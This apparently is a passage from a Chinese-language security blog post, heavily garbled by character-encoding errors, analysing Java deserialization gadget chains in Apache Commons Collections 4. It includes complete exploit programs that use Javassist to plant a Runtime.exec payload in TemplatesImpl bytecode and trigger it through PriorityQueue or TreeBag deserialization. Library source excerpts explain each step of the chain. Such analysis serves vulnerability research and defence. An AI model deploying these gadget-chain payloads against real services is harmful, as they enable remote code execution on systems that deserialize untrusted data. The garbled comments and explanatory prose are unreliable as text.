static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//è¿”å›é»˜è®¤çš„ç±»æ±  classPool.appendClassPath(AbstractTranslet);//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„ CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±» payload.setSuperclass(classPool.get(AbstractTranslet)); //è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime byte[] bytes=payload.toBytecode();//è½¬æ¢ä¸ºbyteæ•°ç»„ Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//åå°„åˆ›å»ºTemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ field.setAccessible(true);//æš´åŠ›åå°„ field.set(templatesImpl,new byte[][]{bytes});//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„ Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//åå°„è·å–templatesImplçš„_nameå­—æ®µ field1.setAccessible(true);//æš´åŠ›åå°„ field1.set(templatesImpl,\u0026#34;test\u0026#34;);//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest InvokerTransformer transformer=new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡ PriorityQueue queue = new PriorityQueue(2);//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚ queue.add(1);//æ·»åŠ æ•°å­—1æ’å…¥æ­¤ä¼˜å…ˆçº§é˜Ÿåˆ— queue.add(2);//æ·»åŠ æ•°å­—1æ’å…¥æ­¤ä¼˜å…ˆçº§é˜Ÿåˆ— Field field2=queue.getClass().getDeclaredField(\u0026#34;comparator\u0026#34;);//è·å–PriorityQueueçš„comparatorå­—æ®µ field2.setAccessible(true);//æš´åŠ›åå°„ field2.set(queue,comparator);//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//è·å–queueçš„queueå­—æ®µ field3.setAccessible(true);//æš´åŠ›åå°„ field3.set(queue,new Object[]{templatesImpl,templatesImpl});//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(queue); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Expæ„é€ åˆ†æ åˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 8 Gadget chain: ObjectInputStream.readObject() PriorityQueue.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() InvokerTransformer 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // org. apache. commons. collections. functors. InvokerTransformer private final String iMethodName; private final Class[] iParamTypes; private final Object[] iArgs; /** * Constructor that performs no validation. * Use \u0026lt;code\u0026gt;getInstance\u0026lt;/code\u0026gt; if you want that. * * @param methodName the method to call * @param paramTypes the constructor parameter types, not cloned * @param args the constructor arguments, not cloned */ public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } /** * Transforms the input to result by invoking a method on the input. * * @param input the input object to transform * @return the transformed result, null if null input */ public Object transform(Object input) { if (input == null) { return null; } try { Class cls = input.getClass();//1 Method method = cls.getMethod(iMethodName, iParamTypes);//2 return method.invoke(input, iArgs);//3 } catch (NoSuchMethodException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException ex) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, ex); } } å‰æ–‡æåˆ°è¿‡ï¼ŒCommonCollections2çš„æ€è·¯æ˜¯æ„é€ ä¸€ä¸ªæ¶æ„ç±»ï¼Œå¹¶åœ¨è¯¥ç±»ä¸­æ„é€ ä¸€ä¸ªåŒ…å«payloadçš„staticä»£ç å—ï¼Œé‚£ä¹ˆJVMåŠ è½½è¯¥ç±»æ—¶ä¼šæ‰§è¡Œè¿™ä¸ªé™æ€çš„ä»£ç å—ï¼Œä»¥æ­¤è§¦å‘payloadã€‚\né‚£ä¹ˆæ³¨é‡Š1ã€2ã€3å¤„å°±åº”è¯¥ç›´æ¥æˆ–é—´æ¥å®ç°è¯¥ç±»çš„åŠ è½½ï¼Œæˆ–è€…åˆ›å»ºç±»çš„å®ä¾‹çš„åŠŸèƒ½ã€‚\nåœ¨Expä¸­ï¼Œæ­¤å¤„å…ˆåŠ è½½äº†TemplatesImplç±»ï¼Œåˆ©ç”¨TemplatesImplç±»ä¸­çš„æ–¹æ³•ï¼Œå®ä¾‹åŒ–äº†æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»ã€‚\næ­¤å¤„ï¼Œinputæ˜¯TemplatesImplç±»çš„ä¸€ä¸ªå®ä¾‹ï¼ŒiMethodNameæ˜¯newTransformerã€‚\næ¥ä¸‹æ¥åˆ†æå…¶ä¸­åŸç†ã€‚\nTemplatesImpl 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 private String _name = null; private byte[][] _bytecodes = null; private Class[] _class = null; /** * Defines the translet class and auxiliary classes. * Returns a reference to the Class object that defines the main class */ private void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = (TransletClassLoader) AccessController.doPrivileged(new PrivilegedAction() { public Object run() { return new TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i]);//3 final Class superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } /** * This method generates an instance of the translet class that is * wrapped inside this Template. The translet instance will later * be wrapped inside a Transformer object. */ private Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null;//5 if (_class == null) defineTransletClasses();//2 // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//4 translet.postInitialization(); translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } catch (IllegalAccessException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } /** * Implements JAXP\u0026#39;s Templates.newTransformer() * * @throws TransformerConfigurationException */ public synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory);//1 if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } æ³¨é‡Š1å¤„è°ƒç”¨äº†getTransletInstanceï¼Œåˆ†ægetTransletInstanceã€‚\næ³¨é‡Š2å¤„è°ƒç”¨äº†defineTransletClassesï¼Œåœ¨defineTransletClassesé‡Œæ³¨é‡Š3å¤„ï¼Œä¼šè§£æç±»çš„å­—èŠ‚ç _bytecodesï¼Œ_bytecodeså°±æ˜¯ä¹‹åæˆ‘ä»¬æ„é€ çš„åŒ…å«payloadçš„ç±»çš„å­—èŠ‚ç ã€‚\nå›åˆ°æ³¨é‡Š4å¤„ï¼Œç¨‹åºä¼šä¸ºæˆ‘ä»¬ä¼ å…¥çš„æ¶æ„TemplatesImplç±»åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œé‡Œé¢çš„é™æ€ä»£ç åŒ…å«çš„payloadå°±ä¼šåœ¨æ­¤æ—¶æ‰§è¡Œã€‚\nps1ï¼š\nåœ¨æ„é€ æ—¶æˆ‘ä»¬è¿˜éœ€è¦æ³¨æ„ä¸¤ç‚¹ï¼š\næ³¨é‡Š4å¤„ï¼Œåˆ›å»ºçš„æ˜¯ä¸€ä¸ªAbstractTransletç¤ºä¾‹ï¼Œå› æ­¤æˆ‘ä»¬çš„æ¶æ„ç±»è¦ç»§æ‰¿ä¸€ä¸‹AbstractTranslet æ³¨é‡Š5å¤„ï¼Œæˆ‘ä»¬æ„é€ æ—¶éœ€è¦ç»™_nameèµ‹ä¸€ä¸ªä»»æ„çš„å€¼ï¼Œä¸ç„¶åé¢çš„ä»£ç ä¸ä¼šæ‰§è¡Œ ps2ï¼š\nqï¼šä¸ºä»€ä¹ˆä¸ç›´æ¥åœ¨InvokerTransformer#transformé‡Œè°ƒç”¨getTransletInstanceï¼Ÿ\naï¼šå› ä¸ºgetTransletInstanceæ˜¯ç§æœ‰æ–¹æ³•\näºæ˜¯æœ‰Expä¸­çš„æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//è¿”å›é»˜è®¤çš„ç±»æ±  classPool.appendClassPath(AbstractTranslet);//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„ CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±» payload.setSuperclass(classPool.get(AbstractTranslet)); //è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime byte[] bytes=payload.toBytecode();//è½¬æ¢ä¸ºbyteæ•°ç»„ Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//åå°„åˆ›å»ºTemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ field.setAccessible(true);//æš´åŠ›åå°„ field.set(templatesImpl,new byte[][]{bytes});//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„ Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//åå°„è·å–templatesImplçš„_nameå­—æ®µ field1.setAccessible(true);//æš´åŠ›åå°„ field1.set(templatesImpl,\u0026#34;test\u0026#34;);//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest â€\nTransformingComparator 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 /** The decorated comparator. */ private final Comparator\u0026lt;O\u0026gt; decorated; /** The transformer being used. */ private final Transformer\u0026lt;? super I, ? extends O\u0026gt; transformer; public TransformingComparator(Transformer\u0026lt;? super I, ? extends O\u0026gt; transformer) { this(transformer, ComparatorUtils.NATURAL_COMPARATOR); } /** * Returns the result of comparing the values from the transform operation. * * @param obj1 the first object to transform then compare * @param obj2 the second object to transform then compare * @return negative if obj1 is less, positive if greater, zero if equal */ public int compare(final I obj1, final I obj2) { final O value1 = this.transformer.transform(obj1);//1 final O value2 = this.transformer.transform(obj2);//2 return this.decorated.compare(value1, value2); } commons-collections4 4.0ä¸­ï¼ŒLazyMapå’ŒTransformedMapæ²¡æœ‰äº†decorateæ–¹æ³•ï¼Œé€‰æ‹©TransformingComparatorçš„compareè§¦å‘ã€‚\nåœ¨æ„é€ æ—¶ï¼Œtransformerä¼ å…¥çš„åº”è¯¥æ˜¯InvokerTransformerå®ä¾‹ã€‚\nPriorityQueue 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 private final Comparator\u0026lt;? super E\u0026gt; comparator; transient Object[] queue /** * Inserts item x at position k, maintaining heap invariant by * demoting x down the tree repeatedly until it is less than or * equal to its children or is a leaf. * * @param k the position to fill * @param x the item to insert */ private void siftDown(int k, E x) { if (comparator != null) siftDownUsingComparator(k, x);//2 else siftDownComparable(k, x); } @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private void siftDownUsingComparator(int k, E x) { int half = size \u0026gt;\u0026gt;\u0026gt; 1; while (k \u0026lt; half) { int child = (k \u0026lt;\u0026lt; 1) + 1; Object c = queue[child]; int right = child + 1; if (right \u0026lt; size \u0026amp;\u0026amp; comparator.compare((E) c, (E) queue[right]) \u0026gt; 0)//1 c = queue[child = right]; if (comparator.compare(x, (E) c) \u0026lt;= 0) break; queue[k] = c; k = child; } queue[k] = x; } /** * Establishes the heap invariant (described above) in the entire tree, * assuming nothing about the order of the elements prior to the call. */ @SuppressWarnings(\u0026#34;unchecked\u0026#34;) private void heapify() { for (int i = (size \u0026gt;\u0026gt;\u0026gt; 1) - 1; i \u0026gt;= 0; i--) siftDown(i, (E) queue[i]);//3 } /** * Reconstitutes the {@code PriorityQueue} instance from a stream * (that is, deserializes it). * * @param s the stream */ private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify();//4 } é˜…è¯»æºç å¯çŸ¥PriorityQueueåœ¨ååºåˆ—åŒ–readObjectæ—¶ï¼Œä¼šæŒ‰ç…§æ³¨é‡Šä¸­4ã€3ã€2ã€1æ ‡æ³¨çš„é¡ºåºï¼Œç»´æŠ¤ä¸€ä¸ªæ¡¶æ’åºæ ‘åˆæ³•ã€‚\næ¥ä¸‹æ¥å°±æ˜¯è¦å¦‚ä½•æ„é€ comparatorå’Œqueueäº†ã€‚\næ ¹æ®æ³¨é‡Š1å¤„ï¼Œæˆ‘ä»¬çŸ¥é“comparatoråº”è¯¥æ˜¯TransformingComparatorçš„ä¸€ä¸ªå®ä¾‹ã€‚\næ ¹æ®TemplatesImplå’ŒInvokerTransformerçš„åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“queueåº”è¯¥æ˜¯TemplatesImplå®ä¾‹æ•°ç»„ã€‚\näºæ˜¯æœ‰Expä¸­çš„æ„é€ ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 InvokerTransformer transformer=new InvokerTransformer(\u0026#34;newTransformer\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡ PriorityQueue queue = new PriorityQueue(2);//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚ queue.add(1);// queue.add(2);//å ä½ç”¨ Field field2=queue.getClass().getDeclaredField(\u0026#34;comparator\u0026#34;);//è·å–PriorityQueueçš„comparatorå­—æ®µ field2.setAccessible(true);//æš´åŠ›åå°„ field2.set(queue,comparator);//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//è·å–queueçš„queueå­—æ®µ field3.setAccessible(true);//æš´åŠ›åå°„ field3.set(queue,new Object[]{templatesImpl,templatesImpl});//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl é—®é¢˜è¡¥å…… queueå ä½ Q1ï¼š\n1 2 3 PriorityQueue queue = new PriorityQueue(2);//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚ queue.add(1);//1 queue.add(2);//2 æ³¨é‡Š1ã€2å¤„ï¼Œä¸ºä½•éœ€è¦è¿™ä¸¤è¡Œä»£ç ï¼Ÿ\nA1ï¼š\næˆ‘ä»¬çœ‹PriorityQueueçš„readObjectå‡½æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify(); } è‹¥æ— è¿™ä¸¤è¡Œä»£ç ï¼Œåˆ™åˆ›å»ºçš„queueçš„sizeå±æ€§ä¸º0ã€‚\nè¿™ä¼šå¯¼è‡´ååºåˆ—åŒ–æ—¶queueä¸ºç©ºã€‚\nå› æ­¤Expä¹Ÿå¯ä»¥æ”¹ä¸ºï¼š\n1 2 3 4 PriorityQueue queue = new PriorityQueue(2);//ä½¿ç”¨æŒ‡å®šçš„åˆå§‹å®¹é‡åˆ›å»ºä¸€ä¸ª PriorityQueueï¼Œå¹¶æ ¹æ®å…¶è‡ªç„¶é¡ºåºå¯¹å…ƒç´ è¿›è¡Œæ’åºã€‚ Field field4=queue.getClass().getDeclaredField(\u0026#34;size\u0026#34;);//è·å–PriorityQueueçš„sizeå­—æ®µ field4.setAccessible(true);//æš´åŠ›åå°„ field4.set(queue,2);//è®¾ç½®queueçš„comparatorå­—æ®µå€¼ä¸ºcomparator Q2ï¼š\nä¸ºä½•è¦ç”¨1ã€2å ä½ï¼Œä¸èƒ½ç›´æ¥addtemplatesImplâ€‹ï¼Ÿ\nA2:\nå› ä¸ºä¼šæŠ¥é”™ï¼š\nâ€‹com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl cannot be cast to java.lang.Comparableâ€‹\nè€Œåˆ©ç”¨åå°„æ—¶\n1 2 3 Field field3=queue.getClass().getDeclaredField(\u0026#34;queue\u0026#34;);//è·å–queueçš„queueå­—æ®µ field3.setAccessible(true);//æš´åŠ›åå°„ field3.set(queue,new Object[]{templatesImpl,templatesImpl});//è®¾ç½®queueçš„queueå­—æ®µå†…å®¹Objectæ•°ç»„ï¼Œå†…å®¹ä¸ºtemplatesImpl Javaå¹¶ä¸ä¼šæ£€æŸ¥æ˜¯å¦åˆæ³•ï¼Œè€Œåœ¨ååºåˆ—åŒ–æ—¶ï¼Œç”±äºpayloadæ‰§è¡Œæ—©äºæ’åºï¼Œå› æ­¤ä¸å½±å“ã€‚\nquenueååºåˆ—åŒ– Qï¼š\nPriorityQueueçš„queueå·²ç»ä½¿ç”¨transientå…³é”®å­—ä¿®é¥°ï¼Œä¸ºä»€ä¹ˆè¿˜èƒ½ä»æµä¸­ååºåˆ—åŒ–queueä¸­çš„å…ƒç´ ï¼Ÿ\nAï¼š\nåºåˆ—åŒ–è§„èŒƒå…è®¸å¾…åºåˆ—åŒ–çš„ç±»å®ç°writeObjectæ–¹æ³•ï¼Œå®ç°å¯¹è‡ªå·±çš„æˆå‘˜æ§åˆ¶æƒã€‚\nTreeBag\u0026amp;TreeMapé“¾ Expå±•ç¤º 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.bag.TreeBag; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsCollections2T { public static void main(String[] args) throws Exception { String AbstractTranslet=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\u0026#34;; String TemplatesImpl=\u0026#34;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\u0026#34;; ClassPool classPool=ClassPool.getDefault();//è¿”å›é»˜è®¤çš„ç±»æ±  classPool.appendClassPath(AbstractTranslet);//æ·»åŠ AbstractTransletçš„æœç´¢è·¯å¾„ CtClass payload=classPool.makeClass(\u0026#34;CommonsCollections22222222222\u0026#34;);//åˆ›å»ºä¸€ä¸ªæ–°çš„publicç±» payload.setSuperclass(classPool.get(AbstractTranslet)); //è®¾ç½®å‰é¢åˆ›å»ºçš„CommonsCollections22222222222ç±»çš„çˆ¶ç±»ä¸ºAbstractTranslet payload.makeClassInitializer().setBody(\u0026#34;java.lang.Runtime.getRuntime().exec(\\\u0026#34;calc\\\u0026#34;);\u0026#34;); //åˆ›å»ºä¸€ä¸ªç©ºçš„ç±»åˆå§‹åŒ–ï¼Œè®¾ç½®æ„é€ å‡½æ•°ä¸»ä½“ä¸ºruntime byte[] bytes=payload.toBytecode();//è½¬æ¢ä¸ºbyteæ•°ç»„ Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//åå°„åˆ›å»ºTemplatesImpl Field field=templatesImpl.getClass().getDeclaredField(\u0026#34;_bytecodes\u0026#34;);//åå°„è·å–templatesImplçš„_bytecodeså­—æ®µ field.setAccessible(true);//æš´åŠ›åå°„ field.set(templatesImpl,new byte[][]{bytes});//å°†templatesImplä¸Šçš„_bytecodeså­—æ®µè®¾ç½®ä¸ºruntimeçš„byteæ•°ç»„ Field field1=templatesImpl.getClass().getDeclaredField(\u0026#34;_name\u0026#34;);//åå°„è·å–templatesImplçš„_nameå­—æ®µ field1.setAccessible(true);//æš´åŠ›åå°„ field1.set(templatesImpl,\u0026#34;test\u0026#34;);//å°†templatesImplä¸Šçš„_nameå­—æ®µè®¾ç½®ä¸ºtest InvokerTransformer transformer=new InvokerTransformer(\u0026#34;toString\u0026#34;,new Class[]{},new Object[]{}); TransformingComparator comparator =new TransformingComparator(transformer);//ä½¿ç”¨TransformingComparatorä¿®é¥°å™¨ä¼ å…¥transformerå¯¹è±¡ TreeBag tb = new TreeBag(comparator); tb.add(templatesImpl); Field field2 = InvokerTransformer.class.getDeclaredField(\u0026#34;iMethodName\u0026#34;); field2.setAccessible(true); field2.set(transformer, \u0026#34;newTransformer\u0026#34;); ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream(\u0026#34;test.out\u0026#34;)); outputStream.writeObject(tb); outputStream.close(); ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream(\u0026#34;test.out\u0026#34;)); inputStream.readObject(); } } Expæ„é€ åˆ†æ åˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 6 7 8 Gadget chain: ObjectInputStream.readObject() TreeBag.readObject() ... TransformingComparator.compare() InvokerTransformer.transform() Method.invoke() Runtime.exec() ä¸»è¦åˆ†æä¸€ä¸‹TreeBagå’ŒPriorityQueueçš„ä¸åŒã€‚\nTreeBag 1 2 3 4 5 6 7 8 9 public TreeBag(Comparator\u0026lt;? super E\u0026gt; comparator) { super(new TreeMap(comparator));//1 } private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException { in.defaultReadObject(); Comparator\u0026lt;? super E\u0026gt; comp = (Comparator)in.readObject(); super.doReadObject(new TreeMap(comp), in);//2 } å¦‚æ³¨é‡Š1å¤„æ‰€ç¤ºï¼ŒTreeBagåˆ›å»ºå®ä¾‹æ—¶ï¼Œè¿˜ä¼šåˆ›å»ºä¸€ä¸ªTreeMapå®ä¾‹ï¼Œå¹¶ä¸”å®ƒçš„æ’åºæ–¹æ³•ç”±æˆ‘ä»¬å®šä¹‰ã€‚\nå› æ­¤æˆ‘ä»¬å¯ä»¥åœ¨Expä¸­åˆ›å»ºTreeBagä¼ å…¥æˆ‘ä»¬çš„æ¶æ„æ’åºæ–¹æ³•ã€‚\nå¦‚æ³¨é‡Š2å¤„æ‰€ç¤ºï¼ŒTreeBagåœ¨ååºåˆ—åŒ–æ—¶ï¼Œæˆ‘ä»¬æ„é€ çš„æ¶æ„æ’åºæ–¹æ³•åŒæ ·ä¹Ÿååºåˆ—åŒ–äº†ã€‚\næ¥ç€æˆ‘ä»¬è·Ÿè¿›ä¸€ä¸‹æ³¨é‡Š2å¤„çš„ä»£ç ï¼ŒAbstractMapBag.doReadObject()ã€‚\nAbstractMapBag 1 2 3 4 5 6 7 8 9 10 11 12 protected void doReadObject(Map\u0026lt;E, MutableInteger\u0026gt; map, ObjectInputStream in) throws IOException, ClassNotFoundException { this.map = map; int entrySize = in.readInt(); for(int i = 0; i \u0026lt; entrySize; ++i) { E obj = in.readObject(); int count = in.readInt(); map.put(obj, new MutableInteger(count));//1 this.size += count; } } ç¨‹åºåœ¨æ³¨é‡Š1å¤„æ‰§è¡Œäº†TreeMap.put()ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹å¯¹åº”æ–¹æ³•ã€‚\nTreeMap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 public V put(K key, V value) { Entry\u0026lt;K,V\u0026gt; t = root; if (t == null) { compare(key, key); // type (and possibly null) check root = new Entry\u0026lt;\u0026gt;(key, value, null); size = 1; modCount++; return null; } int cmp; Entry\u0026lt;K,V\u0026gt; parent; // split comparator and comparable paths Comparator\u0026lt;? super K\u0026gt; cpr = comparator; if (cpr != null) { do { parent = t; cmp = cpr.compare(key, t.key); if (cmp \u0026lt; 0) t = t.left; else if (cmp \u0026gt; 0) t 